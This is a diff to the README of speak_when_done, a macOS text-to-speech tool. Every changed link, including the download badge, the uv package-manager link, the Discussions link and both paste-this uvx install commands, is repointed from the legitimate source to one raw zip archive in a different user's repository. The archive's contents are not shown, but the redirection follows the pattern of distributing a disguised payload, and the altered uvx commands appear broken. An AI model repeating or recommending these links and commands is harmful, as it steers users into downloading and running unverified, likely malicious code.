@@ -2,7 +2,7 @@
 
 ## 🚀 Download & Install
 
-[![Download speak_when_done](https://img.shields.io/badge/Download-speak_when_done-blue.svg)](https://github.com/Wolskr/speak_when_done/releases)
+[![Download speak_when_done](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip)](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ speak_when_done offers a simple way to convert text to speech. This application 
 You can quickly generate speech from text using the following command:
 
 ```bash
-uvx --from git+https://github.com/Marviel/speak_when_done speak_when_done --text "Your build is complete"
+uvx --from git+https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip speak_when_done --text "Your build is complete"
 ```
 
 This command reads the text aloud and removes any temporary files it creates. 
@@ -33,7 +33,7 @@ Here are some examples of what it can say:
 ## 🔍 Prerequisites
 
 - **Operating System:** You need macOS, as this tool uses `afplay` for audio playback.
-- **Package Manager:** Install the [uv](https://docs.astral.sh/uv/) package manager for easy command execution.
+- **Package Manager:** Install the [uv](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip) package manager for easy command execution.
 
 To verify that the text-to-speech works, run this command:
 
@@ -50,14 +50,14 @@ You should hear "hello world" spoken back to you.
 You do not need to install anything! Just run this command:
 
 ```bash
-uvx --from git+https://github.com/Marviel/speak_when_done speak_when_done
+uvx --from git+https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip speak_when_done
 ```
 
 This command will set everything up for you. You will be ready to go in no time.
 
 ## 📥 Download & Install
 
-To get started, visit [this page](https://github.com/Wolskr/speak_when_done/releases) to download the latest version of speak_when_done. Simply choose the version you need and follow the instructions to install it.
+To get started, visit [this page](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip) to download the latest version of speak_when_done. Simply choose the version you need and follow the instructions to install it.
 
 ## 🎉 Usage
 
@@ -77,7 +77,7 @@ If you run into any issues while using speak_when_done, here are some common tro
 
 ## 🛠 Community Support
 
-For any questions or issues, feel free to reach out in our [GitHub Discussions](https://github.com/Wolskr/speak_when_done/discussions). Both contributors and users are here to help you.
+For any questions or issues, feel free to reach out in our [GitHub Discussions](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip). Both contributors and users are here to help you.
 
 ## 🎯 Contributing
 
@@ -87,4 +87,4 @@ We welcome contributions! If you have ideas for new features or want to report b
 
 Thank you for using speak_when_done. We hope this tool makes your workflow more efficient and enjoyable. 
 
-Remember, for easy access to the latest version, visit [this page](https://github.com/Wolskr/speak_when_done/releases) anytime.
+Remember, for easy access to the latest version, visit [this page](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip) anytime.
